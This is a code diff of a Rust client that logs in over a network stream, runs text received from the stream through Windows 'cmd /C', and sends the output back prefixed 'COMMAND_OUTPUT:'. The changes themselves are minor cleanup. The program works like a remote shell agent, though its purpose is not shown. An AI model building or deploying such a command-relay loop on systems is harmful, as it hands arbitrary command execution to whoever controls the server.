@@ -24,9 +24,6 @@ fn main() {
                             if response.contains("Login successful") {
                                 connected = 1;
                             }
-                            if response.contains("Register successful") {
-                                connected = 1;
-                            }
                         }
                         Err(e) => {
                             eprintln!("Failed to read response: {}", e);
@@ -35,8 +32,8 @@ fn main() {
                     }
                 } 
                 else {
-                    let resultat = run_piped_command(&buffer);
-                    let formatted_message = format!("COMMAND_OUTPUT:{}", resultat);
+                    let command = run_piped_command(&buffer);
+                    let formatted_message = format!("COMMAND_OUTPUT:{}", command);
                     stream.write(formatted_message.as_bytes()).unwrap();
                     match stream.read(&mut response) {
                         Ok(bytes_read) => {
@@ -57,8 +54,8 @@ fn main() {
     }
 }
 fn run_piped_command(command: &str) -> String {
-    match Command::new("cmd") // Use cmd.exe on Windows
-        .arg("/C") // Use /C to execute the command
+    match Command::new("cmd")
+        .arg("/C")
         .arg(command)
         .output()
     {
